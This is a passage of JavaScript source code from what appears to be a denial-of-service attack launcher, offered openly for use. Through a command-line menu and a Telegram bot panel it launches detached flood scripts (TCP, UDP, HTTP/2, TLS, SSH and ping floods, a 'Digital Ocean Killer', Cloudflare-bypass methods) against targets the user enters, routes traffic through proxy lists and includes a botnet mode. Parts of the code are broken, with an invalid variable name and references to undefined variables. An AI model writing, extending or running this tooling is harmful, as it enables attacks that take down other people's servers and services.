⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    SA MP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : HammzXG`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `22`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function tcp(args) {
  if (args.length < 3) {
    console.log(`Example: tcp <target> <duration>
tcp 123.456.78.910 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    TCP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : TCP FLOOD
Creator  : HammzXG`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

exec(`.HammzXTCP ${target} ${port} ${time}`)
sigma()
};
// ================================================== //
async function transformBot(args) {
  hammz.question('Insert Your Telegram Token: ', (telegramToken) => {
    hammz.question('Insert Your Telegram ID: ', (telegramId) => {
      const Sikma = new TelegramBot(telegramToken, { polling: true });
      
      console.clear();
      console.log(`Successfully Connected With:\nBot Token:\t${telegramToken}\nChat ID:\t${telegramId}`);

      const mainMenu = {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Flood Notification', callback_data: 'flood_notif' },
              { text: 'Subdomain Finder', callback_data: 'subdo_finder' }
            ],
            [
              { text: 'Kill SSH', callback_data: 'kill_ssh' }
            ],
            [
              { text: 'Kill PING', callback_data: 'kill_ping' },
              { text: 'Killer Digital Ocean', callback_data: 'kill_do' }
            ],
            [
              { text: 'Attack', callback_data: 'start_attack' }
            ],
            [
              { text: 'Main Menu', callback_data: 'main_start' }
            ],
            [
              { text: 'Back CLI', callback_data: 'back_cli' }
            ]
          ]
        }
      };

      const methodsList = {
        reply_markup: {
          keyboard: [
            [{ text: 'Ninja' }, { text: 'Tls' }],
            [{ text: 'Bomb' }, { text: 'Httpx' }],
            [{ text: 'Udp' }, { text: 'Raw' }],
            [{ text: 'Flood' }, { text: 'ResetV2' }],
            [{ text: 'FloodV2' }, { text: 'Reset' }],
            [{ text: 'Raw' }, { text: 'H2' }],
            [{ text: 'Browser' }, { text: 'Tcp' }]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      };
      
      const extendLimau = {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Back To Main Menu', callback_data: 'main_start' } /*,
              { text: '', callback_data: '' }*/
            ]
          ]
        }
      };

      Sikma.onText(/\/start/, (msg) => {
        Sikma.sendMessage(telegramId, 'Welcome to **Darknet Mode Bot Tele**. Select an option:', mainMenu);
      });

      Sikma.on('callback_query', async (callbackQuery) => {
        const action = callbackQuery.data;

        switch (action) {
          case 'main_start':
            await Sikma.sendMessage(telegramId, 'Welcome to **Darknet Mode Bot Tele**. Select an option:', mainMenu);
            break;
          case 'kill_ssh':
            await KillSSH1(telegramId, Sikma);
            break;
          case 'flood_notif':
            await handleFloodNotif(telegramId, Sikma);
            break;
          case 'subdo_finder':
            await subdomainFinder(telegramId, Sikma);
            break;
          case 'kill_ping':
            await handleKillPING(telegramId, Sikma);
            break;
          case 'kill_do':
            await handleKillDO(telegramId, Sikma);
            break;
          case 'start_attack':
            await startAttackPrompt(telegramId, Sikma);
            break;
          case 'back_cli':
            await Sikma.sendMessage(telegramId, 'Bot Will Stop And Back To CLI Mode.')
            await Sikma.stopPolling();
            await banner();
            sigma()
            break;
          default:
            Sikma.sendMessage(telegramId, 'Unknown action.');
            break;
        }
      });
// [==================================================================================] //
      async function handleKillDO(telegramId, Sikma) {
        const pathSSH = path.join(__dirname, `HammzXSSH`);
        const pathFlood = path.join(__dirname, `HammzXFLOODV2`);
        const pathRaw = path.join(__dirname, `HammzXRAW`);
        Sikma.sendMessage(telegramId, 'Enter Target URL:')
        Sikma.once('message', async (msg) => {
          const targetUrl = msg.text;
          Sikma.sendMessage(telegramId, 'Enter Target IP:')
          Sikma.once('message', async (msg) => {
            const targetIP = msg.text;
            Sikma.sendMessage(telegramId, 'Enter Duration:')
            Sikma.once('message', async (msg) => {
              const duration = parseInt(msg.text);
              Sikma.sendMessage(telegramId, `Attack Started\n**Digital Ocean Killer**\n**Target URL:** ${targetUrl}\n**Target IP:** ${targetIP}\n**Duration:** ${duration}`, extendLimau);
              const SSHWorker = spawn('node', [pathSSH, targetIP, '22', 'root', duration], {
                detached: true,
                stdio: 'ignore',
            });
            const FloodWorker = spawn('node', [pathFlood, targetUrl, duration], {
              detached: true,
              stdio: 'ignore',
          });
          const RawWorker = spawn('node', [pathRaw, `http://${targetIP}`, duration], {
            detached: true,
            stdio: 'ignore',
        });
        RawWorker.unref();
          FloodWorker.unref();
            SSHWorker.unref();
                        })
          })
        })
      }
// [==================================================================================] //
      async function startAttackPrompt(telegramId, Sikma) {
        Sikma.sendMessage(telegramId, 'Select Attack Methods:', methodsList)
        Sikma.once('message', async (msg) => {
          const yabe = msg.text;
          let yabai = ''
          let methods = ''
          let kimakk = ''
          let target = ''
          let duration = ''
          const reset = path.join(__dirname, `HammzXRESET`);
          const resetv2 = path.join(__dirname, `HammzXRESETV2`);
          const rape = path.join(__dirname, `HammzXRAW`);
          const execDestroy =`node ${reset} ${target} ${duration} 100 1 proxy.txt`
          const execHammz-sad = `node ${resetv2} ${target} ${duration} 100 15 proxy.txt`
          const execRape =`node ${rape} ${target} ${duration} 60 7 proxy.txt`
          if (yabe === 'Kill') {
            yabai = 'kill';
            methods = path.join(__dirname, `HammzXKILL`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'Flood') {
            yabai = 'flood';
            methods = path.join(__dirname, `HammzXFLOOD`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'FloodV2') {
            yabai = 'floodv2';
            methods = path.join(__dirname, `HammzXFLOODV2`);
              kimakk = `node ${methods} ${target} ${duration} 10 90 proxy.txt`;
          } else if (yabe === 'Reset') {
            yabai = 'reset';
            methods = path.join(__dirname, `HammzXRESET`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'ResetV2') {
            yabai = 'resetv2';
            methods = path.join(__dirname, `HammzXRESETV2`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'H2') {
            yabai = 'h2';
            methods = path.join(__dirname, `HammzXH2`);
              kimakk = `node ${methods} ${target} ${duration} 32 10 proxy.txt`;
          } else if (yabe === 'Ninja') {
            yabai = 'ninja';
            methods = path.join(__dirname, `HammzXNJA`);
              kimakk = `node ${methods} ${target} ${duration} 32 10 proxy.txt`;
          } else if (yabe === 'Bypass') {
            yabai = 'bypass';
            methods = path.join(__dirname, `HammzXBYPASS`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'Udp') {
            yabai = 'udp';
            methods = path.join(__dirname, `HammzXUDP`);
              kimakk = `node ${methods} ${target} ${duration} 50 4 proxy.txt`;
          } else if (yabe === 'Tcp') {
            yabai = 'tcp';
            methods = path.join(__dirname, `HammzXTCP`);
              kimakk = `node ${methods} ${target} ${duration} 50 4 proxy.txt`;
          } else if (yabe === 'Httpx') {
            yabai = 'httpx'
            methods = path.join(__dirname, `HammzXHTTPX`)
              kimakk = `node ${methods} ${target} ${duration} 50 10 proxy.txt`
          } else if (yabe === 'Slim') {
            Sikma.sendMessage(telegramId, 'Nice Choices.')
          } else {
            Sikma.sendMessage(telegramId, 'Undefined Methods')
            return
          }
          Sikma.sendMessage(telegramId, 'Enter Target Link:')
          Sikma.once('message', async (msg) => {
             target = msg.text;
            Sikma.sendMessage(telegramId, 'Enter Duration:')
            Sikma.once('message', async (msg) => {
               duration = parseInt(msg.text)
              await Sikma.sendMessage(telegramId, `Attack Launched\nMethods: ${yabe}\nTarget: ${target}\nDuration\b${duration}\nCreator: V3 `)
              if (yabe === 'Slim') {
                const DestroyWorker = spawn(execDestroy, {
                  detached: true,
                  stdio: 'ignore',
              });
              const StormWorker = spawn(execStorm, {
                detached: true,
                stdio: 'ignore',
            });
            const RapeWorker = spawn(execRape, {
              detached: true,
              stdio: 'ignore',
          });
          DestroyWorker.unref();
          StormWorker.unref();
          RapeWorker.unref();
              } else {
                exec(kimakk)
              }
            })
          })
        })
      }
// [==================================================================================] //
      async function subdomainFinder(telegramId, Sikma) {
        Sikma.sendMessage(telegramId, 'Enter domain\nExample: google.com');
        Sikma.once('message', async (msg) => {
          try {
            let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${msg.text}`);
            let uniqueSubdomains = [...new Set(response.data.data)];
            let hasilmanuk = uniqueSubdomains.map((data) => {
              return `${data}`;
            }).join('\n');
            Sikma.sendMessage(telegramId, '**Subdomain Finder** For ' + msg.text + '\n' + hasilmanuk, extendLimau);
          } catch (error) {
            Sikma.sendMessage(telegramId, 'Error fetching subdomains. Please try again later.');
          }
        });
      }
// [==================================================================================] //
      async function handleKillPING(telegramId, Sikma) {
        const pathPING = path.join(__dirname, `18`);
        Sikma.sendMessage(telegramId, 'Enter target IP Address:');
        Sikma.once('message', async (msg) => {
          const TargetIP = msg.text
          Sikma.sendMessage(telegramId, 'Enter duration in seconds:');
          Sikma.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              Sikma.sendMessage(telegramId, 'Invalid duration.');
            } else {
              Sikma.sendMessage(telegramId, `Attack Started\n**Methods:** KILL PING\n**Target:** ${TargetIP}\n**Duration:** ${duration}`, extendLimau);
              exec(`node ${pathPING} ${TargetIP} 65500 10 10 ${duration}`);
            }
          });
      });
      }
// [==================================================================================] //
      async function KillSSH1(telegramId, Sikma) {
        const pathSSH = path.join(__dirname, `HammzXSSH`);
        Sikma.sendMessage(telegramId, 'Enter target IP Address:');
        Sikma.once('message', async (msg) => {
          const TargetIP = msg.text
          Sikma.sendMessage(telegramId, 'Enter target Port:');
          Sikma.once('message', async (msg) => {
            const targetPort = msg.text  
          Sikma.sendMessage(telegramId, 'Enter duration in seconds:');
          Sikma.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              Sikma.sendMessage(telegramId, 'Invalid duration.');
            } else {
              Sikma.sendMessage(telegramId, `Attack Started\n**Methods:** KILL SSH\n**Target:** ${TargetIP}\n**Port:** ${targetPort}\n**Duration:** ${duration}`, extendLimau);
              exec(`node ${pathSSH} ${TargetIP} ${targetPort} root ${duration}`);
            }
          });
        });
      });
      }
// [==================================================================================] //
async function chat_ai() {
hammz.question('[\x1b[1m\x1b[31m Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://widipe.com/gpt4?text=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By V3

Thx To:
Allah SWT
Permen (base)
HammzXG (PEMBUAT  TOOLS)
`
hammz.question(
'[\x1b[1m\x1b[32mSUPERNOVA ★ BLACKHOLE-HOME ($)\x1b[0m]: ', (input) => {
    const [command, ...args] = input.trim().split(' ');

  if (command === 'help') {
    console.log(`
NAME        │ ALIAS              │ DESCRIPTION
────────────┼────────────────────┼────────────────────────────────────
 help       │ ----               │ Menunjukan Semua Command
 methods    │ ----               │ Menunjukan Semua Methods
 clear      │ ----               │ Menunjukan Banner mu
 ongoing    │ ----               │ Menumjukan serangan
 tutorial   │ ----               │ Tutorial Penggunaan
 credits    │ ----               │ credits
 news       │ ----               │ Melihat news update
 bot-tele   │ ----               │ Mengubah Menjadi Bot Tele
 botnet     │ ----               │ Menyerang Dengan Banyak Server
 botnet-mt  │ ----               │ Melihat Semua Methods Botnet
 cekserver  │ ----               │ Mengecek Server 
 add-server │ ----               │ Menambah Server
`);
    sigma();
  } else if (command === 'botnet-mt') {
  	console.log(`
█░░ ▄▀█ █▄█ █▀▀ █▀█ ▀▀█     
█▄▄ █▀█ ░█░ ██▄ █▀▄ ░░█ 
──────────────────────────────
► VIP
     - hammz-lucky    ► HTTP1        │  - h2-jouma   ► BEST METHODS
     - hammz-entot  ► Uam Bypasser │  - hammz-mode     ► HOLD WEBSITE
     - hammz-space    ► NON PROTECT  │  - bypass-hammz   ► BYPASS NORMAL WEB
     - tlsv2  ► TLS 1.2 & 1.3│  - sigma    ► BEST BYPASS CF
     - h2-hammz   ► HIGH REQ/S   │  - hammz-blackhole   ► GOOD FOR HARD TARGET
     - h2-ranxx   ► SLOW REQUEST │  - pluto    ► BASIC BYPASS
     - resetv2  ► BEST BYPASSER│  - mix      ► MIX METHOD GET & POST
     - hammz-spin  ► FLOODING H2  │  - kill-hammz    ► NON SSL TARGET/PANEL
     - hammz-sad  ► HIGH REQ/S H2│  - hammz-spam ► HTTP1 SPAM REQ
──────────────────────────────
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
                      ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
                      ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
                      ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
╔═══════════════════════════════════════════════════════════╗
\x1b[30;47mL A Y E R 7\x1b[0m│\x1b[31m[METHODS] [TARGET] [PORT] [TIME]                                                             
\x1b[31m♦\x1b[0m MIX         │ High Rps Bypass Non Protect              
\x1b[31m♦\x1b[0m KILL       │ Flooding Request With Http2
\x1b[31m♦\x1b[0m BYPASS      │ Bypass Protect Website
\x1b[31m♦\x1b[0m FLOOD       │ Good For Non Ssl Target          
\x1b[31m♦\x1b[0m FLOODV2       │ Bypass Recaptcha With Good Header
\x1b[31m♦\x1b[0m RESET         │ Flood Request With Http1
\x1b[31m♦\x1b[0m RESETV2        │ Bypass Cf Non Protect
\x1b[31m♦\x1b[0m HTTPX       │ Bypass Cf With Good Header
\x1b[31m♦\x1b[0m UAM       │ Best Method
\x1b[31m♦\x1b[0m H2      │ Bypass Hard Target
\x1b[31m♦\x1b[0m        │ Bypass Normal Web
\x1b[31m♦\x1b[0m        │ Http/1 Only
\x1b[31m♦\x1b[0m        │ Bypass Cf With High Req
\x1b[31m♦\x1b[0m PLUTO       │ Low Request With Legit Header
\x1b[31m♦\x1b[0m H2      │ Best Method(2)
\x1b[31m♦\x1b[0m BOMB        │ Kill Web Non Protect With Big Req
\x1b[30;47mL A Y E R 4\x1b[0m│\x1b[31m[METHODS] [TARGET] [PORT] [TIME]\x1b[0m                                                                  
\x1b[31m♦\x1b[0m TCP         │ Attack Ip For Game
\x1b[31m♦\x1b[0m UDP         │ Attack Ip For Game,Dstat        
\x1b[31m♦\x1b[0m TLS     │ Digital ocean killer
\x1b[31m♦\x1b[0m  SAMP       │ Flooding Server Samp
╚═══════════════════════════════════════════════════════════╝
\x1b[31m♦\x1b[0m  NOTE : PAKAI HURUF KAPITAL SAAT MENGGUNAKAN METHOD
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if(command === 'bot-tele') {
  	transformBot(args) 
      sigma()
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'gataulah') {
    handleAttackCommand(args);
  } else if (command === 'tutorial') {
  	console.log(`
 Tutorial Menggunakan
 methods target port time
 contoh => TLS https://website.com 443 60`);
    sigma();
  } else if (command === 'MIX') {
    mix(args);
  } else if (command === 'TLS') {
  	tls(args);
  } else if (command === 'UAM') {
  	uam(args);
  } else if (command === 'KILL') {
  	kill(args);
  } else if (command === 'BOMB') {
  	bomb(args);
  } else if (command === 'RESETV2') {
  	resetv2(args);
  } else if (command === 'HTTPX') {
  	httpx(args);
  } else if (command === 'NINJA') {
  	ninja(args);
  } else if (command === 'RAW') {
  	raw(args);
  } else if (command === 'UDP') {
  	udp(args);
  } else if (command === 'BYPASS') {
  	bypass(args);
  } else if (command === 'BROWSER') {
  	browser(args);
  } else if (command === 'H2') {
  	h2(args);
  } else if (command === '') {
  	storm(args);
  } else if (command === '') {
  	raw(args);
  } else if (command === '') {
  	stars(args);
  } else if (command === '') {
  	http1(args);
  } else if (command === 'KILL-DO') {
  	killDo(args);
  } else if (command === 'TCP') {
  	tcp(args);
  } else if (command === 'FLOOD') {
  	flood(args);
  } else if (command === 'FLOODV2') {
    floodv2(args);
    } else if (command === 'add-server') {
    processBotnetEndpoint(args);
  } else if (command === 'cekserver') {
    checkBotnetEndpoints()
  } else if (command === 'botnet') {
    Botnethitam(args);
  } else if (command === 'ongoing') {
    monitorOngoingAttacks()
    sigma()
  } else if (command === 'ai') {
    console.log(`ZyoJir Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()